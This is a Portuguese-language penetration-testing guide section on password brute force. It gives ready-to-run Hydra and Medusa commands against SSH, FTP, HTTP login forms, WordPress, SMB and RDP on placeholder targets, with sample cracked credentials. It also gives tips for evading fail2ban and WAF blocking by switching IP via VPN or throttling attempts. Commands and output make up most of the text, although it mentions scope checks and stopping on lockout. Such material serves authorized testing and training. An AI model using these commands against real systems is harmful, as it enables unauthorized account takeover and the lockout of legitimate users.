## FASE 3 — Brute Force (Hydra)

**Tempo estimado:** 60-120 minutos
**Objetivo:** Obter CREDENCIAIS VÁLIDAS em serviços e logins web — usando os alvos e usuários organizados na Fase 1 e priorizados na Fase 2.
**Por quê:** Uma senha válida é acesso imediato sem precisar de exploit. É o ataque mais simples e mais eficaz quando há serviços de login expostos.

> ⚠️ **ANTES de rodar qualquer Hydra:** confirme na `16-vetores/escopo.md` que brute force é permitido neste alvo. Labs = sim; produção real = NÃO.

> **📡 Dados usados nos passos abaixo (de onde vêm):**
> - **Hydra SSH/FTP/SMB/RDP:** `15-alimentacao/usernames-todos.txt` ← MANUAL-RECON `01-intel/theharvester.txt`; `wordlist-bruteforce.txt` ← CeWL + SecLists; alvos/portas ← MANUAL-RECON `02-enum/nmap-services.txt` (via `15-alimentacao/alvos-servicos.txt`)
> - **Hydra HTTP (Passo 3.4):** `15-alimentacao/formularios.txt` ← MANUAL-WEB `09-descoberta/logins-formularios.txt` (Passo 2.9 do Módulo 02) — ele traz URL, campos e mensagem de erro exata
> - **Credenciais prontas (Passo 3.1):** `15-alimentacao/credenciais-texto.txt` ← MANUAL-RECON `04-discovery/` + MANUAL-WEB `08-alimentacao/secrets-web.txt`

---

### Passo 3.1 — Primeiro, teste credenciais em texto puro (1 tentativa só)

**O que você vai fazer:** Se o Módulo 01/02 encontrou senhas em texto (`credenciais-texto.txt`), teste-as ANTES de brute force. Uma tentativa ≠ força bruta.

```bash
# Ver as credenciais encontradas
cat 15-alimentacao/credenciais-texto.txt

# Testar uma credencial direto no SSH (uma tentativa)
ssh -o BatchMode=yes -o ConnectTimeout=5 admin@10.0.0.1
# Digite a senha encontrada quando pedir

# Ou com Hydra em modo "senha única" (1 tentativa por usuário)
hydra -l admin -p 'EvilCorp2024!' -t 1 -f ssh://10.0.0.1
```

**✅ Output esperado (acerto):**
```
[22][ssh] host: 10.0.0.1   login: admin   password: EvilCorp2024!
```

**O que fazer:** Se funcionou → **pule para o Passo 3.7** (validar e documentar). Não faça brute force se já tem a senha.

---

### Passo 3.2 — Brute force SSH (Hydra)

**O que você vai fazer:** Testar combinações usuário+senha no serviço SSH usando as listas da Fase 1.

```bash
# Versão segura: usuário único + wordlist pequena + para no 1º hit
hydra -l admin -P 15-alimentacao/wordlist-bruteforce.txt -t 4 -f -o 17-bruteforce/hydra-ssh.txt ssh://10.0.0.1

# Versão completa: lista de USUÁRIOS do alvo + wordlist
hydra -L 15-alimentacao/usernames-todos.txt -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
      -t 4 -f -o 17-bruteforce/hydra-ssh.txt ssh://10.0.0.1

# Flags explicadas:
# -l admin  = usuário único      | -L arquivo = lista de usuários
# -P arquivo = lista de senhas   | -p senha   = senha única
# -t 4       = 4 tentativas simultâneas (MÁXIMO recomendado)
# -f         = PARA no primeiro acerto
# -o arquivo = salva resultados
```

**✅ Output esperado (encontrou senha):**
```
[22][ssh] host: 10.0.0.1   login: admin   password: admin123
[22][ssh] host: 10.0.0.1   login: suporte   password: suporte2024
1 of 1 target successfully completed, 1 valid password found
```

**✅ Output esperado (não encontrou):**
```
0 of 1 target completed, 0 valid passwords found
```

**O que procurar:** Linhas com `login:` e `password:` = credenciais VÁLIDAS. Salve tudo em `17-bruteforce/`.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `0 valid passwords found` rápido demais | Wordlist vazia ou serviço bloqueou | Verifique `wc -l wordlist`; teste com `-v` (verbose) |
| `login: ... password: ...` mas não conecta | Falso positivo (alguns SSHs aceitam qualquer coisa) | **Valide manualmente:** `ssh user@10.0.0.1` com a senha |
| Hydra trava / "0 valid" instantâneo | IP banido pelo fail2ban | Pare, mude de IP (VPN), espere 30min |
| Muito lento | `-t` alto demais ou rede lenta | Mantenha `-t 4`; reduza para `-t 2` |
| `hydra: command not found` | Não instalado | `sudo apt install hydra` |
| Porta diferente de 22 | SSH em porta não padrão | `hydra -s 2222 ... ssh://10.0.0.1` |

---

### Passo 3.3 — Brute force FTP (Hydra)

**O que você vai fazer:** Mesmo princípio do SSH, no FTP. FTP normalmente **não tem lockout** por padrão — mas respeite o escopo.

```bash
hydra -L 15-alimentacao/usernames-todos.txt \
      -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
      -t 4 -f -o 17-bruteforce/hydra-ftp.txt ftp://10.0.0.1
```

**✅ Output esperado:**
```
[21][ftp] host: 10.0.0.1   login: anonymous   password: anonymous
[21][ftp] host: 10.0.0.1   login: ftpuser   password: ftp123
```

**O que procurar:**
- **`anonymous`/`anonymous`** → acesso anônimo = falha de configuração (documente!)
- **Qualquer combinação válida** → faça login e liste os arquivos: `ftp 10.0.0.1`

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `anonymous` funciona mas vazio | Anônimo sem permissão de escrita | Ainda é achado (MÉDIO); documente |
| `permanent: 421` | Servidor cheio ou banindo | Mude de IP, espere |
| Login OK mas `530 Login incorrect` | Hydra errou o parse | Teste manualmente: `ftp 10.0.0.1` |

---

### Passo 3.4 — Brute force HTTP POST form (Hydra)

**O que você vai fazer:** Atacar os formulários de login que você mapeou no **Módulo 02 (MANUAL-WEB)** — este é o ponto exato onde os dois módulos se conectam. Os campos vêm de `15-alimentacao/formularios.txt` (importado no Passo 1.4 de `09-descoberta/logins-formularios.txt`).

```bash
# Formato do http-post-form do Hydra:
# /caminho:campos_com_^USER^_e_^PASS^:string_de_falha

# 1) Login genérico (campos username/password — do arquivo formularios.txt,
#    que veio de 09-descoberta/logins-formularios.txt no MANUAL-WEB)
hydra -L 15-alimentacao/usernames-todos.txt \
      -P 15-alimentacao/wordlist-bruteforce.txt \
      -t 1 -W 3 -f \
      -o 17-bruteforce/hydra-http-login.txt \
      evilcorp.com http-post-form \
      "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# 2) WordPress (campos log/pwd — padrão do wp-login.php)
hydra -l admin -P 15-alimentacao/wordlist-bruteforce.txt \
      -t 1 -W 3 -f \
      -o 17-bruteforce/hydra-wp.txt \
      evilcorp.com http-post-form \
      "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=/wp-admin/:F=ERROR"

# Flags especiais de HTTP:
# -t 1  = UMA tentativa por vez (WAF conta tentativas!)
# -W 3  = espera 3 segundos entre tentativas
# -f    = para no primeiro acerto
# F=    = string que aparece quando a senha está ERRADA (obrigatório!)
# S=    = alternativa: string que aparece quando está CERTA
```

**Como descobrir a string `F=` (do Módulo 02):** se o form veio de `15-alimentacao/formularios.txt`, a mensagem de erro já está na 4ª coluna do arquivo (ex.: `Invalid credentials`). Só descubra manualmente se o arquivo estiver vazio:
```bash
# No navegador: tente logar com senha ERRADA e copie a mensagem exata
# Ou via curl:
curl -s -X POST http://evilcorp.com/login -d "username=test&password=wrong"
# Output: {"error":"Invalid credentials"}   →  F=Invalid credentials

# Confirme os nomes dos campos (F12 → Network → veja o POST body)
```

**✅ Output esperado (encontrou):**
```
[80][http-post-form] host: evilcorp.com   login: admin   password: admin2024
[80][http-post-form] host: evilcorp.com   password found: admin / admin2024
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Tudo "falha", até senha correta | String `F=` errada | Erre o login manualmente e copie a mensagem EXATA |
| Sempre "sucesso" (falso positivo) | Site redireciona igual em erro | Use `S=` (string de sucesso) em vez de `F=` |
| WAF bloqueia (403/429) | Rate limit | Reduza para `-t 1 -W 10`; se bloquear, pule para outro vetor |
| 302/301 sempre | Formulário usa redirect | Inspecione no Burp/navegador o que muda entre certo e errado |
| `Invalid character` no Hydra | `&` ou `:` no form | Escape: use `\:`, ou rode em arquivo `-O` de opções |

> 💡 **Sempre que o Hydra HTTP der resultado estranho, volte ao Módulo 02 e re-confirme o comportamento do form no navegador/Burp.**

---

### Passo 3.5 — Brute force SMB e RDP

**O que você vai fazer:** Windows exposto na 445 (SMB) ou 3389 (RDP) — usuários vêm do OSINT ou de enumeração SMB.

```bash
# SMB (Windows) — teste primeiro usuário "administrator"
hydra -l administrator -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
      -t 4 -f -o 17-bruteforce/hydra-smb.txt smb://10.0.0.1

# RDP
hydra -L 15-alimentacao/usernames-todos.txt -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
      -t 4 -f -o 17-bruteforce/hydra-rdp.txt rdp://10.0.0.1

# Enumerar usuários SMB antes (melhora MUITO a taxa de acerto)
# (esta etapa é do Módulo 04 — pós-exploração/redes — mas é útil aqui)
nmap --script smb-enum-users -p 445 10.0.0.1
```

**✅ Output esperado:**
```
[445][smb] host: 10.0.0.1   login: administrator   password: Admin@123
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `protocol error` no SMB | Hydra vs versão SMB | Use `-s 445` explícito ou enumere usuários primeiro |
| Conta bloqueada (0x C0000064) | Windows lockout | **PARE IMEDIATAMENTE** — você está travando contas reais |
| RDP 0 resultados | NLA protegendo | Teste com CrackMapExec (Módulo 04) ou mude de vetor |

---

### Passo 3.6 — Alternativa: Medusa (quando o Hydra falha)

**O que você vai fazer:** Medusa é paralelo e às vezes lida melhor com protocolos específicos.

```bash
# Mesmo ataque SSH com Medusa
medusa -h 10.0.0.1 -u admin -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
       -M ssh -T 4 -O 17-bruteforce/medusa-ssh.log

# Flags:
# -h host  | -u usuário | -P wordlist
# -M módulo (ssh, ftp, http, smb...)
# -T 4 threads | -O arquivo de log
```

**✅ Output esperado (acerto):**
```
ACCOUNT FOUND:  ssh  admin:admin123  [SUCCESS]
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `medusa: command not found` | Não instalado | `sudo apt install medusa` |
| Módulo não suportado | Protocolo raro | Volte ao Hydra (50+ protocolos) |

---

### Passo 3.7 — Validar e documentar as credenciais encontradas

**O que você vai fazer:** Credencial NÃO validada = falso positivo. Confirme cada acerto logando de verdade.

```bash
# 1) Confirmar SSH
ssh -o ConnectTimeout=5 admin@10.0.0.1
# Se entrou → válido ✅. Rode: whoami; hostname; exit

# 2) Confirmar FTP
ftp 10.0.0.1    # login: admin  password: admin123
# Se listou diretório → válido ✅

# 3) Confirmar HTTP (no navegador ou curl)
curl -s -X POST http://evilcorp.com/login \
  -d "username=admin&password=admin2024" -i | head -20
# Se retornou sessão/cookie/302 para /admin → válido ✅

# 4) Documentar IMEDIATAMENTE
cat > 17-bruteforce/credenciais-encontradas.md << 'EOF'
# Credenciais Encontradas — evilcorp.com

| # | Serviço | Host | Usuário | Senha | Valida? | Evidência |
|---|---------|------|---------|-------|:---:|-----------|
| 1 | SSH 22 | 10.0.0.1 | admin | admin123 | ✅ | ssh + whoami retornou "admin" |
| 2 | HTTP login | evilcorp.com/login | admin | admin2024 | ✅ | 302 para /admin com cookie PHPSESSID |

## Testar também em outros serviços (reutilização de credencial)
- [ ] Mesma senha no FTP 21?
- [ ] Mesma senha no painel /wp-admin?
- [ ] Mesma senha em outros hosts do range?
EOF
```

**O que procurar:**
- **Reuso de credencial** → a mesma senha serve em outro serviço? (testar é barato e documentar é ouro)
- **Privilégio do usuário** → `admin` no SSH = quase root; `ftpuser` no FTP = só leitura

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Hydra achou mas login falha | Falso positivo | **NÃO documente como achado** — ajuste o Hydra e rode de novo |
| Entrou mas `permission denied` | Usuário sem shell | Documente como "credencial válida, sem acesso shell" (MÉDIO) |

---

### Checklist da Fase 3

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | Credenciais em texto testadas primeiro | `15-alimentacao/credenciais-texto.txt` | [ ] |
| 2 | SSH brute force | `17-bruteforce/hydra-ssh.txt` | [ ] |
| 3 | FTP brute force (se porta 21 aberta) | `17-bruteforce/hydra-ftp.txt` | [ ] |
| 4 | HTTP form brute force (se tem login web) | `17-bruteforce/hydra-http-login.txt` | [ ] |
| 5 | SMB/RDP (se 445/3389 abertas) | `17-bruteforce/hydra-smb.txt` | [ ] |
| 6 | Credenciais VALIDADAS manualmente | `17-bruteforce/credenciais-encontradas.md` | [ ] |

### 📁 Sua pasta deve estar assim ao final da Fase 3:

```
17-bruteforce/
├── hydra-ssh.txt             ← resultados do Hydra no SSH
├── hydra-ftp.txt             ← resultados no FTP
├── hydra-http-login.txt      ← resultados no login web (Módulo 02)
├── hydra-wp.txt              ← resultados no WordPress
├── hydra-smb.txt             ← resultados no SMB
├── medusa-ssh.log            ← alternativa Medusa
└── credenciais-encontradas.md ← ACHADO VALIDADO + evidência
```

### ✅ Sinal de sucesso:
- Pelo menos **1 credencial validada** em `credenciais-encontradas.md`, OU
- **Prova documentada** de que brute force não funcionou (alvo bem protegido)

### ❌ Se falhou:
- 0 resultados em tudo → wordlist errada? Volte à Fase 1 (usernames do alvo). IP banido? Veja [20-nao-funcionou.md](20-nao-funcionou.md).
- Falsos positivos → sempre valide com login manual antes de documentar.

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 3 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `credenciais-encontradas.md` | Fase 5 | Credenciais podem destravar Metasploit (ex: `set SMBUser/SMBPass`) |
| `credenciais-encontradas.md` | Fase 6 | Evidência de impacto |
| `credenciais-encontradas.md` | Fase 7 | Item principal do relatório |
| Tentativas registradas | Fase 6 | Métrica de esforço e lockout riscos |

**Se completou tudo (ou provou que não funciona) → Avance para [Fase 4 — Cracking](10-fase4-cracking.md)**
